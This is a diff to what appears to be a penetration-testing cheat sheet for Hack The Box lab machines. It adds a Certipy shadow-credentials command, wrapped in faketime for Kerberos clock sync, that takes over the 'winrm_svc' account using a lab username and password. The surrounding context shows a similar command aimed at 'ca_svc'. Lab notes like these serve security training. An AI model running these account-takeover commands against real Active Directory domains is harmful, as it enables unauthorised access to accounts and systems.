@@ -44,6 +44,9 @@ Example :
 ```shell 
 certipy-ad shadow auto -u ryan@sequel.htb -p '<password>' -dc-ip 10.129.251.172 -ns 10.129.251.172 -target dc01.sequel.htb -account ca_svc
 ```
+```shell
+faketime "$(ntpdate -q fluffy.htb | awk '{print $1" "$2}')" certipy shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip 10.129.193.226 -account 'winrm_svc'
+```
 
 ### Template
 
